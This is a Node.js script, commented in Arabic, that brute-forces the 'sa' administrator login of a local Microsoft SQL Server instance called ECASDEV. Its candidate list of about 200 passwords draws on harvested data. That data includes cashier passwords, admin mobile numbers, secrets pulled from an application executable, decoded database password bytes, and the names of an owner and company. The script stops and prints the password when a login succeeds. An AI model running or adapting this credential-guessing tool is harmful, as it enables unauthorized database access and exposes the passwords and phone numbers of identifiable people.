/**
 * آخر محاولة: brute force موسّع لـ sa
 * يشمل: كل قيم DB + variations + mobile numbers + MOBSERL + creative patterns
 */
import sql from 'mssql';

const BASE = {
  server: 'localhost',
  options: { instanceName: 'ECASDEV', trustServerCertificate: true, encrypt: false },
  connectionTimeout: 4_000,
};

async function tryLogin(user, pw) {
  const pool = new sql.ConnectionPool({ ...BASE, database: 'master', user, password: pw });
  try {
    await pool.connect();
    await pool.close();
    return true;
  } catch {
    return false;
  }
}

const candidates = [
  // nullandnotempty variations
  'nullandnotempty',
  'NullAndNotEmpty', 'NULLANDNOTEMPTY', 'Nullandnotempty',
  'null_and_not_empty', 'null-and-not-empty', 'null and not empty',
  'nullandnotempty123', 'nullandnotempty!', 'nullandnotempty@',

  // ECAS application defaults
  '11225511', '123123', 'mypassword4lonin', 'mypassword4login',
  'MTEyMjU1MTE', 'MTIzMTIz',

  // Connection string patterns from exe
  '123', 'Ecas@123', 'Ecas@9982.zuc', 'Ecas@2668.zuc', 'Ecas@2673.zuc',
  'Ecas@2664.zuc', 'Ecas@2670.zuc', 'LitN3wYnet_123',
  'Ecas@123;', 'ecas@123',

  // Password from UserData
  '10120101', '2664', '2023', '1994', 'hgtjhpd78', '424666',

  // Cashier passwords
  '333333', '772771', '123321', '137950', 'ALAA781716017',
  'qazqaz', '201154', '111111', '112233', '702699', '111110',
  '555555', '888888', '999999', '701411339', '777777', '6040401',
  '734370110',

  // Hints & Adjectives (literal)
  '13', '1', '666', '2222', 'ميلاد', 'مبرمج النظام', 'System PassWord',

  // Mobile numbers from admin records
  '777289900', '777707971', '771506017', '774434111', '774434222',
  '733466600', '00967', '00967771506017', '0967771506017',

  // MOBSERL (hex strings as passwords)
  '3647081526bc30c8', '4161fbe0f94da0ed',

  // DB_PassWord bytes as strings
  'd3b5f83189c6398c23edb14537d0', 'd3 b5 f8 31 89 c6 39 8c 23 ed b1 45 37 d0',
  '07X4MYnGOYwj7bFFN9A=',

  // Sabaliya company
  'SabalyahEle', 'Sabalyah', 'Sabalyahele', 'sabalyahele',
  'Lit_SabalyahEle_$_2668@255',

  // Challengers / forensics
  'Challengers', 'Challengers@yahoo.com', 'YemenID', 'zuakha033',
  'YIDedCheckLicnce07710114', 'YemenID-PC10', 'YemenID-PC11',

  // Standard / weak
  'sa', 'Sa', 'SA', 'admin', 'Admin', 'Administrator',
  'password', 'Password', 'P@ssw0rd', 'P@ssword',
  '12345', '123456', '12345678', 'qwerty', '1234567890',

  // Owner-related (محمد العباسي)
  'Mohammed', 'mohammed', 'محمد', 'محمد العباسي',
  'Abbasi', 'abbasi', 'AbbasiMd', 'Abbasi@2026', 'Abbasi2026',
  'Alabbasi', 'alabbasi', 'AlAbbasi', 'Al-Abbasi',
  'alhambh', 'Alhambh', 'Alhambh@2026', 'alhambh2026',
  'AlhamRead@2026!', 'AlhamRead2026!', 'AlhamRead2026',
  'almham_reader', 'AlmhamReader', 'Almham@2026',
  'almham', 'Almham', 'ALMHAM',

  // Yemen themes
  'yemen', 'Yemen', 'YEMEN', 'sanaa', 'Sanaa', 'Taiz', 'TAIZ',
  'AlDahmiya', 'Dahmiya', 'dahmiya', 'AlSabaliya', 'Sabaliya',
  'Jamal', 'jamal', 'Ghalil', 'ghalil',

  // Date formats
  '2026', '2025', '2024', '2023', '20260421', '20260420',
  '20260419', '21042026', '20042026',

  // ECAS version
  'Ecas9.0.4', 'Ecas904', '9.0.4', '904',

  // Sysinternals-style
  'sqlserver', 'SqlServer', 'SQL2019', 'sql2022',
  'mssql', 'MSSQL',

  // Instance-related
  'ECASDEV', 'ecasdev', 'Ecasdev',

  // Specific ECAS patterns
  'mypassword4lonin@', 'mypassword4login@',
  '!Ecas@123', 'Ecas@@123',
];

async function main() {
  console.log(`┌─ اختبار sa مع ${candidates.length} كلمة سر ─┐\n`);
  let tried = 0;
  for (const pw of candidates) {
    tried++;
    const ok = await tryLogin('sa', pw);
    if (ok) {
      console.log(`\n⭐⭐⭐ MATCH !!!`);
      console.log(`   user:     sa`);
      console.log(`   password: "${pw}"`);
      console.log(`\n✅ كلمة سر Administrator في ECAS = "${pw}"`);
      process.exit(0);
    }
    if (tried % 20 === 0) process.stdout.write(`  ... جُرّب ${tried}/${candidates.length}\n`);
  }
  console.log(`\n(${tried}/${candidates.length}: لا تطابق — لا يوجد في القاموس)`);
  process.exit(0);
}

main().catch(e => { console.error(e); process.exit(1); });
